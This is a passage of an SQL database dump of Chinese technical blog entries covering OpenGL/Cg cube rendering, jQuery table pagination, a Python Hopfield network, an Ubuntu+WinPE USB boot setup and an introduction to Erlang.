GL_CLAMP_TO_BORDER);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER);&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_2D, 0,GL_RGBA16F_ARB, width, height, 0, GL_RGBA, GL_FLOAT, NULL);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //最终显示到屏幕时用的纹理&nbsp;&nbsp;&nbsp; glGenTextures(1, &amp;fboFinal);&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D, fboFinal);&nbsp;&nbsp;&nbsp; glTexEnvi(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_REPLACE);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_BORDER);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER);&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_2D, 0,GL_RGBA16F_ARB, width, height, 0, GL_RGBA, GL_FLOAT, NULL);}void initCG(){&nbsp;&nbsp;&nbsp; glewInit();&nbsp;&nbsp;&nbsp; CGcontext context = cgCreateContext();&nbsp;&nbsp;&nbsp; vertexProfile = CG_PROFILE_ARBVP1;&nbsp;&nbsp;&nbsp; fragmentProfile = CG_PROFILE_ARBFP1;&nbsp;&nbsp;&nbsp; loadCgProgram(\"lr2final.cg\", context, vertexProgram, fragmentProgram, vertexProfile, fragmentProfile);}void drawCube(float x, float y, float z){&nbsp;&nbsp;&nbsp; glBegin(GL_QUADS);&nbsp;&nbsp;&nbsp; /* Back side */&nbsp;&nbsp;&nbsp; glNormal3f(0.0, 0.0, -1.0); //表示前向面的法线&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, 0.0); &nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,-1);&nbsp;&nbsp;&nbsp; vertex(0.0, y, 0.0);&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,-1);&nbsp;&nbsp;&nbsp; vertex(x, y, 0.0);&nbsp;&nbsp;&nbsp; glVertex3f(x,y,-1);&nbsp;&nbsp;&nbsp; vertex(x, 0.0, 0.0);&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,-1);&nbsp;&nbsp;&nbsp; /* Front side */&nbsp;&nbsp;&nbsp; glNormal3f(0.0, 0.0, 1.0);&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, z);&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,z);&nbsp;&nbsp;&nbsp; vertex(x, 0.0, z);&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,z);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; vertex(x, y, z);&nbsp;&nbsp;&nbsp; glVertex3f(x,y,z);&nbsp;&nbsp;&nbsp; vertex(0.0, y, z);&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,z);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; /* Top side */&nbsp;&nbsp;&nbsp; glNormal3f(0.0, 1.0, 0.0);&nbsp;&nbsp;&nbsp; vertex(0.0, y, 0.0);&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,-1);&nbsp;&nbsp;&nbsp; vertex(0.0, y, z);&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,z);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; vertex(x, y, z);&nbsp;&nbsp;&nbsp; glVertex3f(x,y,z);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; vertex(x, y, 0.0);&nbsp;&nbsp;&nbsp; glVertex3f(x,y,-1);&nbsp;&nbsp;&nbsp; /* Bottom side */&nbsp;&nbsp;&nbsp; glNormal3f(0.0, -1.0, 0.0);&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, 0.0);&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,-1);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; vertex(x, 0.0, 0.0);&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,-1);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; vertex(x, 0.0, z);&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,z);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, z);&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,z);&nbsp;&nbsp;&nbsp; /* Left side */&nbsp;&nbsp;&nbsp; glNormal3f(-1.0, 0.0, 0.0);&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, 0.0);&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,-1);&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, z);&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,z);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; vertex(0.0, y, z);&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,z);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; vertex(0.0, y, 0.0);&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,-1);&nbsp;&nbsp;&nbsp; /* Right side */&nbsp;&nbsp;&nbsp; glNormal3f(1.0, 0.0, 0.0);&nbsp;&nbsp;&nbsp; vertex(x, 0.0, 0.0);&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,-1);&nbsp;&nbsp;&nbsp; vertex(x, y, 0.0);&nbsp;&nbsp;&nbsp; glVertex3f(x,y,-1);&nbsp;&nbsp;&nbsp; vertex(x, y, z);&nbsp;&nbsp;&nbsp; glVertex3f(x,y,z);&nbsp;&nbsp;&nbsp; vertex(x, 0.0, z);&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,z);&nbsp;&nbsp;&nbsp; glEnd();&nbsp;&nbsp;&nbsp; }void vertex(float x, float y, float z) //pass{&nbsp;&nbsp;&nbsp; glColor3f(x,y,z);&nbsp;&nbsp;&nbsp; glMultiTexCoord3fARB(GL_TEXTURE1_ARB, x, y, z);//这个是给索引纹理类容用的呀，我怎么能忘记喃}','',0,'graphics',0,'','zinnia/_entry_detail.html','entry_detail.html'),(334,'jquery对table实现分类并分页','3373193720091016103116132',2,'2009-11-16 10:31:16',NULL,'2009-11-16 10:31:16','2014-07-13 18:57:25','jquery，很好，很强大。<br />需求：若干条记录，要求可以分类，并可以针对每个分类进行分页<br /><br />方案：<br />1. 将每个tr看做一条记录，对每个tr赋予一个class “所有分类”，这样就可以用$(\".所有分类\").hide()完成隐藏<br />2. 对每个tr再赋予一个class：该记录真正的分类“X分类”，这样就可以用$(\".X分类\").show()显示特定的分类<br />3. 在分类改变的时候，根据该分类的记录数，产生分页列表，并绑定分页事件<br />4. 点击分页列表的时候，调用displayPage函数进行分页<br />5. 首先根据页号计算起始和终止记录号，然后遍历记录列表，显示相应页<br /><br />注意：<br />不能用$(\".page\").click绑定分页事件<br /><br />TODO：<br />&nbsp;当前显示页的页号仍然可以点击<br /><br />源代码table.html<br />&lt;script src=\"jquery.js\"&gt;&lt;/script&gt;<br />&lt;script type=\"text/javascript\"&gt;<br />var pageSize = 3;//每页显示的记录条数<br />$(document).ready(function(){&nbsp;&nbsp; &nbsp;<br />&nbsp;&nbsp; &nbsp;$(\"#selType\").change(function(){<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; var page=($(\".\"+$(\"#selType\").val()).length-1)/pageSize+1;//根据记录条数，计算页数<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var pageLabel=\'\'<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for(i=1;i&lt;=page;i++)<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pageLabel+=\"&lt;a href=\'#\' class=\'page\' onclick=\'displayPage(\"+i+\");\'&gt;\"+i+\"&lt;/a&gt;&amp;nbsp;&amp;nbsp;\";<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(\"#pageLabel\").html(pageLabel);//显示分页控制列表<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;displayPage(1);//显示第一页<br />&nbsp;&nbsp; &nbsp;})<br />&nbsp;&nbsp; &nbsp;$(\"#selType\").trigger(\'change\');//页面载入时，触发分页事件<br />})<br />function displayPage(page){<br />&nbsp;&nbsp; &nbsp;var begin=(page-1)*pageSize;//起始记录号<br />&nbsp;&nbsp; &nbsp;var end=page*pageSize;//终止记录号<br />&nbsp;&nbsp; &nbsp;$(\".所有车间\").hide();<br />&nbsp;&nbsp; &nbsp;$(\".\"+$(\"#selType\").val()).each(function(i){<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if(i&gt;=begin &amp;&amp; i&lt;end)//显示第page页的记录<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(this).show();<br />&nbsp;&nbsp; &nbsp;});<br />&nbsp;&nbsp; &nbsp;return false;<br />}<br />&lt;/script&gt;<br />&lt;select id=\"selType\"&gt;<br />&lt;option id=\'allType\'&gt;所有车间&lt;/option&gt;<br />&lt;option&gt;A车间&lt;/option&gt;<br />&lt;option&gt;B车间&lt;/option&gt;<br />&lt;/select&gt;<br />&lt;table&gt;<br />&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;1&lt;/td&gt;&lt;/tr&gt;<br />&lt;tr class=\"所有车间 B车间\"&gt;&lt;td&gt;2&lt;/td&gt;&lt;/tr&gt;<br />&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;3&lt;/td&gt;&lt;/tr&gt;<br />&lt;tr class=\"所有车间 B车间\"&gt;&lt;td&gt;4&lt;/td&gt;&lt;/tr&gt;<br />&lt;tr class=\"所有车间 C车间\"&gt;&lt;td&gt;5&lt;/td&gt;&lt;/tr&gt;<br />&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;6&lt;/td&gt;&lt;/tr&gt;<br />&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;7&lt;/td&gt;&lt;/tr&gt;<br />&lt;tr class=\"所有车间 B车间\"&gt;&lt;td&gt;8&lt;/td&gt;&lt;/tr&gt;<br />&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;9&lt;/td&gt;&lt;/tr&gt;<br />&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;10&lt;/td&gt;&lt;/tr&gt;<br />&lt;tr class=\"所有车间 B车间\"&gt;&lt;td&gt;11&lt;/td&gt;&lt;/tr&gt;<br />&lt;/table&gt;<br />&lt;div id=\"pageLabel\"&gt;&lt;/div&gt;',1,1,1,0,0,0,'jquery，很好，很强大。需求：若干条记录，要求可以分类，并可以针对每个分类进行分页方案：1. 将每个tr看做一条记录，对每个tr赋予一个class “所有分类”，这样就可以用$(\".所有分类\").hide()完成隐藏2. 对每个tr再赋予一个class：该记录真正的分类“X分类”，这样就可以用$(\".X分类\").show()显示特定的分类3. 在分类改变的时候，根据该分类的记录数，产生分页列表，并绑定分页事件4. 点击分页列表的时候，调用displayPage函数进行分页5. 首先根据页号计算起始和终止记录号，然后遍历记录列表，显示相应页注意：不能用$(\".page\").click绑定分页事件TODO：&nbsp;当前显示页的页号仍然可以点击源代码table.html&lt;script src=\"jquery.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt;var pageSize = 3;//每页显示的记录条数$(document).ready(function(){&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(\"#selType\").change(function(){&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; var page=($(\".\"+$(\"#selType\").val()).length-1)/pageSize+1;//根据记录条数，计算页数&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var pageLabel=\'\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for(i=1;i&lt;=page;i++)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pageLabel+=\"&lt;a href=\'#\' class=\'page\' onclick=\'displayPage(\"+i+\");\'&gt;\"+i+\"&lt;/a&gt;&amp;nbsp;&amp;nbsp;\";&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(\"#pageLabel\").html(pageLabel);//显示分页控制列表&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;displayPage(1);//显示第一页&nbsp;&nbsp; &nbsp;})&nbsp;&nbsp; &nbsp;$(\"#selType\").trigger(\'change\');//页面载入时，触发分页事件})function displayPage(page){&nbsp;&nbsp; &nbsp;var begin=(page-1)*pageSize;//起始记录号&nbsp;&nbsp; &nbsp;var end=page*pageSize;//终止记录号&nbsp;&nbsp; &nbsp;$(\".所有车间\").hide();&nbsp;&nbsp; &nbsp;$(\".\"+$(\"#selType\").val()).each(function(i){&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if(i&gt;=begin &amp;&amp; i&lt;end)//显示第page页的记录&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(this).show();&nbsp;&nbsp; &nbsp;});&nbsp;&nbsp; &nbsp;return false;}&lt;/script&gt;&lt;select id=\"selType\"&gt;&lt;option id=\'allType\'&gt;所有车间&lt;/option&gt;&lt;option&gt;A车间&lt;/option&gt;&lt;option&gt;B车间&lt;/option&gt;&lt;/select&gt;&lt;table&gt;&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;1&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"所有车间 B车间\"&gt;&lt;td&gt;2&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;3&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"所有车间 B车间\"&gt;&lt;td&gt;4&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"所有车间 C车间\"&gt;&lt;td&gt;5&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;6&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;7&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"所有车间 B车间\"&gt;&lt;td&gt;8&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;9&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"所有车间 A车间\"&gt;&lt;td&gt;10&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"所有车间 B车间\"&gt;&lt;td&gt;11&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;div id=\"pageLabel\"&gt;&lt;/div&gt;','',0,'\"web skills\"',0,'','zinnia/_entry_detail.html','entry_detail.html'),(335,'神经网络之Hopfield','337319372010614105249188',2,'2010-07-14 22:52:49',NULL,'2010-07-14 22:52:49','2014-07-13 18:57:25','Hopfield 是最简单的神经网络之一，是一种单层神经网络。<br />方法比较也很简单<br />训练：<br />首先将weight矩阵初始为0，然后对每个样本：<br />1.1. 将输入的true/false转变为1/-1，生成向量mat<br />1.2. 将mat转置后再乘以mat，得到矩阵w<br />1.3. 将矩阵w的对角线元素设置为0<br />1.4. 将weight矩阵加上w矩阵<br /><br />计算：<br />2.1 将输入的true/false转变为1/-1，生成向量input<br />2.2 将input乘以weight，得到向量v<br />2.3 对向量v的每个元素，如果&gt;0，输出为true，否则为false<br /><br />代码：<br />#!/usr/bin/python<br />class Hopfield:<br />&nbsp;&nbsp;&nbsp; def __init__(self,n):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.n=n<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.weight=[[0 for j in range(n)] for i in range(n)]<br />&nbsp;&nbsp;&nbsp; def train(self,input):#训练<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mat=[x and 1 or -1 for x in input] #1.1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res=[[0 for j in range(self.n)] for i in range(self.n)]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for i in range(self.n):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for j in range(self.n):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if i!=j: #1.3<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.weight[i][j]+=mat[i]*mat[j] #1.2 1.4<br /><br />&nbsp;&nbsp;&nbsp; def pred(self,input):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mat=[x and 1 or -1 for x in input] #2.1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res=[0 for i in range(self.n)]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for i in range(self.n):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for j in range(self.n):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res[i]+=mat[j]*self.weight[j][i] #2.2<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret=[x&gt;0 and True or False for x in res] #2.3<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return ret<br /><br />if __name__==\'__main__\':<br />&nbsp;&nbsp;&nbsp; #input 1 输入<br />&nbsp;&nbsp;&nbsp; input1=[False, True, False, True]<br />&nbsp;&nbsp;&nbsp; input2=[True, False, False, True]<br />&nbsp;&nbsp;&nbsp; input3=[True, False, True, False] #no need to train, it is mirror of 1<br />&nbsp;&nbsp;&nbsp; #train 训练<br />&nbsp;&nbsp;&nbsp; net=Hopfield(4)<br />&nbsp;&nbsp;&nbsp; net.train(input1)<br />&nbsp;&nbsp;&nbsp; net.train(input2)<br />&nbsp;&nbsp;&nbsp; #classification with train result 计算<br />&nbsp;&nbsp;&nbsp; out1=net.pred(input1)<br />&nbsp;&nbsp;&nbsp; out2=net.pred(input2)<br />&nbsp;&nbsp;&nbsp; out3=net.pred(input3)<br />&nbsp;&nbsp;&nbsp; print out1<br />&nbsp;&nbsp;&nbsp; print out2<br />&nbsp;&nbsp;&nbsp; print out3',1,1,1,0,0,0,'Hopfield 是最简单的神经网络之一，是一种单层神经网络。方法比较也很简单训练：首先将weight矩阵初始为0，然后对每个样本：1.1. 将输入的true/false转变为1/-1，生成向量mat1.2. 将mat转置后再乘以mat，得到矩阵w1.3. 将矩阵w的对角线元素设置为01.4. 将weight矩阵加上w矩阵计算：2.1 将输入的true/false转变为1/-1，生成向量input2.2 将input乘以weight，得到向量v2.3 对向量v的每个元素，如果&gt;0，输出为true，否则为false代码：#!/usr/bin/pythonclass Hopfield:&nbsp;&nbsp;&nbsp; def __init__(self,n):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.n=n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.weight=[[0 for j in range(n)] for i in range(n)]&nbsp;&nbsp;&nbsp; def train(self,input):#训练&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mat=[x and 1 or -1 for x in input] #1.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res=[[0 for j in range(self.n)] for i in range(self.n)]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for i in range(self.n):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for j in range(self.n):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if i!=j: #1.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.weight[i][j]+=mat[i]*mat[j] #1.2 1.4&nbsp;&nbsp;&nbsp; def pred(self,input):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mat=[x and 1 or -1 for x in input] #2.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res=[0 for i in range(self.n)]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for i in range(self.n):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for j in range(self.n):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res[i]+=mat[j]*self.weight[j][i] #2.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret=[x&gt;0 and True or False for x in res] #2.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return retif __name__==\'__main__\':&nbsp;&nbsp;&nbsp; #input 1 输入&nbsp;&nbsp;&nbsp; input1=[False, True, False, True]&nbsp;&nbsp;&nbsp; input2=[True, False, False, True]&nbsp;&nbsp;&nbsp; input3=[True, False, True, False] #no need to train, it is mirror of 1&nbsp;&nbsp;&nbsp; #train 训练&nbsp;&nbsp;&nbsp; net=Hopfield(4)&nbsp;&nbsp;&nbsp; net.train(input1)&nbsp;&nbsp;&nbsp; net.train(input2)&nbsp;&nbsp;&nbsp; #classification with train result 计算&nbsp;&nbsp;&nbsp; out1=net.pred(input1)&nbsp;&nbsp;&nbsp; out2=net.pred(input2)&nbsp;&nbsp;&nbsp; out3=net.pred(input3)&nbsp;&nbsp;&nbsp; print out1&nbsp;&nbsp;&nbsp; print out2&nbsp;&nbsp;&nbsp; print out3','',0,'other',0,'','zinnia/_entry_detail.html','entry_detail.html'),(336,'8G U盘制作Ubuntu+WinPE双启动盘','33731937200937115251232',2,'2009-04-07 23:52:51',NULL,'2009-04-07 23:52:51','2014-07-13 18:57:25','思路:<br />使用Ubuntu将U盘分为两个区, 一个FAT32, 一个ext3, 然后使用Grub引导<br />用到的软件:<br />vmware5.5绿色版 ubuntu-8.04-server-i386.iso grub4dos WinPE<br />步骤<br />1. 在vmware中新建虚拟机, 使用物理硬盘也就是8GU盘作为硬盘, 然后从ubuntu镜像开始安装, 分区时先分一个5G的FAT32主分区, 挂载为/dos,设为启动分区, 然后创建一个3G的扩展分区, ext3挂载为/<br />2. 安装完成后已经可以进入ubuntu了, 修改/boot/grub/menu.lst, 加入DOS和WinPE启动项<br />title win98<br />root hd(0,0)<br />kernel /boot/grub/memdisk.gz<br />initrd /boot/grub/win99.zip<br /><br />title WinPE<br />root hd(0,0)<br />chainloader /grldr<br />boot<br />3. 将压缩包内的文件解压缩到/dos分区即可<br />压缩包下载地址: http://dl.getdropbox.com/u/194885/U.rar<br />',1,1,1,0,0,0,'思路:使用Ubuntu将U盘分为两个区, 一个FAT32, 一个ext3, 然后使用Grub引导用到的软件:vmware5.5绿色版 ubuntu-8.04-server-i386.iso grub4dos WinPE步骤1. 在vmware中新建虚拟机, 使用物理硬盘也就是8GU盘作为硬盘, 然后从ubuntu镜像开始安装, 分区时先分一个5G的FAT32主分区, 挂载为/dos,设为启动分区, 然后创建一个3G的扩展分区, ext3挂载为/2. 安装完成后已经可以进入ubuntu了, 修改/boot/grub/menu.lst, 加入DOS和WinPE启动项title win98root hd(0,0)kernel /boot/grub/memdisk.gzinitrd /boot/grub/win99.ziptitle WinPEroot hd(0,0)chainloader /grldrboot3. 将压缩包内的文件解压缩到/dos分区即可压缩包下载地址: http://dl.getdropbox.com/u/194885/U.rar','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(337,'Erlang入门','3373193720078710251198',2,'2007-09-07 10:02:51',NULL,'2007-09-07 10:02:51','2014-07-13 18:57:25','<div><font face=\"Verdana\">Erlang不但是一种编程语言，而且它具有比编程语言更加贴近操作系统的一些特性：并发线程、作业调度、内存管理、分布式、网络化等。它具有超强的轻量级进程，这种进程对内存的需求是动态变化的。Erlang支持超大量级的并发线程，并且不需要操作系统具有并发机制。据说使用Erlang编写的Yaws Web服务器，其并发性能是apache的15倍</font></div>\n<div><font face=\"Verdana\"></font>&nbsp;</div>\n<div><font face=\"Verdana\">Erlang具有以下特性：<br /><br /><b>并发性</b> - Erlang具有超强的轻量级进程，这种进程对内存的需求是动态变化的，并且它没有共享内存和通过异步消息传送的通讯。Erlang支持超大量级的并发线程，并且不需要操作系统具有并发机制。<br /><br /><b>分布式</b> - Erlang被设计用于运行在分布式环境下。一个Erlang虚拟机被成为Erlang节点。一个分布式Erlang系统是多个Erlang节点组成的网络（通常每个处理器被作为一个节点）。一个Erlang节点能够创建运行在其它节点上的并行线程，而其它节点可以使用其它操作系统。线程依赖不同节点之间的通讯，这完全和它依赖于单一节点一样。<br /><br /><b>健壮性</b> - Erlang具有多种基本的错误检测能力，它们能够用于构建容错系统。例如，进程能够监控其它进程的状态和活动，甚至这些进程是在其它节点上执行。在分布式系统中的线程能够配置为在其它节点故障的情况下自动进行故障恢复，并在故障节点恢复时自动迁移回到恢复节点。<br /><br /><b>软实时性</b> - Erlang支持可编程的“软”实时系统，这种系统需要反应时间在毫秒级。而在这种系统中，长时间的垃圾收集（garbage collection）延迟是无法接受的，因此Erlang使用了递增式垃圾收集技术。<br /><br /><b>热代码升级</b> - 一些系统不能够由于软件维护而停止运行。Erlang允许程序代码在运行系统中被修改。旧代码能被逐步淘汰而后被新代码替换。在此过渡期间，新旧代码是共存的。这也使得安装bug补丁、在运行系统上升级而不干扰系统操作成为了可能。<br /><br /><b>递增式代码装载</b> - 用户能够控制代码如何被装载的细节。在嵌入式系统中，所有代码通常是在启动时就被完全装载。而在开发系统中，代码是按需装载的，甚至在系统运行时被装载的。如果测试到了未覆盖的bug，那么只有具有bug的代码需要被替换。<br /><br /><b>外部接口</b> - Erlang进程与外部世界之间的通讯使用和在Erlang进程之间相同的消息传送机制。这种机制被用于和操作系统通讯、与其它语言编写的程序交互。如果出于高效率的需要，这种机制的一个特殊版本也允许例如C程序这样的代码直接链接到Erlang运行时系统中来。<br /></font></div>\n<div><font face=\"Verdana\">--Erlang的语法简洁性导致了代码可读性的下降，如果能在两者之间稍加平衡的话，可能其流行度会得到不少提升。也许是Erlang过于注重性能了，把性能作为其core business了。</font></div></font>',1,1,1,0,0,0,'Erlang不但是一种编程语言，而且它具有比编程语言更加贴近操作系统的一些特性：并发线程、作业调度、内存管理、分布式、网络化等。它具有超强的轻量级进程，这种进程对内存的需求是动态变化的。Erlang支持超大量级的并发线程，并且不需要操作系统具有并发机制。据说使用Erlang编写的Yaws Web服务器，其并发性能是apache的15倍\n&nbsp;\nErlang具有以下特性：并发性 - Erlang具有超强的轻量级进程，这种进程对内存的需求是动态变化的，并且它没有共享内存和通过异步消息传送的通讯。Erlang支持超大量级的并发线程，并且不需要操作系统具有并发机制。分布式 - Erlang被设计用于运行在分布式环境下。一个Erlang虚拟机被成为Erlang节点。一个分布式Erlang系统是多个Erlang节点组成的网络（通常每个处理器被作为一个节点）。一个Erlang节点能够创建运行在其它节点上的并行线程，而其它节点可以使用其它操作系统。线程依赖不同节点之间的通讯，这完全和它依赖于单一节点一样。健壮性 - Erlang具有多种基本的错误检测能力，它们能够用于构建容错系统。例如，进程能够监控其它进程的状态和活动，甚至这些进程是在其它节点上执行。在分布式系统中的线程能够配置为在其它节点故障的情况下自动进行故障恢复，并在故障节点恢复时自动迁移回到恢复节点。软实时性 - Erlang支持可编程的“软”实时系统，这种系统需要反应时间在毫秒级。而在这种系统中，长时间的垃圾收集（garbage collection）延迟是无法接受的，因此Erlang使用了递增式垃圾收集技术。热代码升级 - 一些系统不能够由于软件维护而停止运行。Erlang允许程序代码在运行系统中被修改。旧代码能被逐步淘汰而后被新代码替换。在此过渡期间，新旧代码是共存的。这也使得安装bug补丁、在运行系统上升级而不干扰系统操作成为了可能。递增式代码装载 - 用户能够控制代码如何被装载的细节。在嵌入式系统中，所有代码通常是在启动时就被完全装载。而在开发系统中，代码是按需装载的，甚至在系统运行时被装载的。如果测试到了未覆盖的bug，那么只有具有bug的代码需要被替换。外部接口 - 